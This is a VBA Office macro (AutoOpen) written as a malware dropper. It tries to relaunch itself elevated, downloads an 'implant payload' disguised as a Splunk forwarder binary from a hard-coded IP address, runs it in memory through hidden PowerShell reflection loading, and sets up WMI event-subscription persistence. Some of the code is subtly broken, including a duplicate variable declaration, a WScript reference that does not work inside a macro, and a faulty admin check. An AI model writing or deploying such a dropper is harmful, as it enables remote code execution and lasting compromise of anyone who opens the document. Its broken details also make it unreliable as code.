Sub AutoOpen()
    ' Define variables for paths and objects
    Dim shell As Object
    Dim xHttp As Object
    Dim bStrm As Object
    Dim payload() As Byte
    Dim payloadLen As Long

    ' Get the AppData folder path
    Dim appDataPath As String
    appDataPath = Environ("APPDATA")

    ' Check if running as administrator
    On Error Resume Next
    Dim isAdmin As Boolean
    ' Query the system to check if the script is running with administrative privileges
    isAdmin = (GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2").ExecQuery("Select * from Win32_Account where SID = 'S-1-5-32-544'").Count > 0)
    On Error GoTo 0

    If Not isAdmin Then
        ' If not running as administrator, restart the script with elevated privileges
        Dim shell As Object
        Set shell = CreateObject("Shell.Application")
        ' Re-run the script using the "runas" verb to elevate privileges
        shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
        Exit Sub
    End If

    ' Download the implant payload from a specified URL
    Set xHttp = CreateObject("Microsoft.XMLHTTP")
    xHttp.Open "GET", "http://9.53.99.47/splunkforwarder.bin", False
    xHttp.Send

    ' Read the binary data into a byte array
    payloadLen = LenB(xHttp.responseBody)
    ReDim payload(payloadLen)
    payload = xHttp.responseBody
    
    ' Execute the payload in memory using PowerShell
    Dim cmd As String
    cmd = "powershell -nop -w hidden -c ""[Reflection.Assembly]::Load([System.Convert]::FromBase64String('" & Base64Encode(payload) & "')).EntryPoint.Invoke($null, $null)"""

    ' Execute the in-memory payload
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd, 0, False
    
    ' Persistence via WMI Event Subscription
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -c ""$filter = Set-WmiInstance -Namespace 'root\subscription' -Class __EventFilter -Arguments @{Name='BootTrigger'; EventNamespace='Root\Cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_LocalTime WHERE Day = 1'}; $consumer = Set-WmiInstance -Namespace 'root\subscription' -Class CommandLineEventConsumer -Arguments @{Name='PersistenceConsumer'; CommandLineTemplate='" & cmd & "'}; Set-WmiInstance -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}""", 0, False
End Sub

Function Base64Encode(ByVal binaryData() As Byte) As String
    Dim objXML As Object
    Dim objNode As Object
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.createElement("Base64Data")
    objNode.dataType = "bin.base64"
    objNode.nodeTypedValue = binaryData
    Base64Encode = objNode.Text
End Function
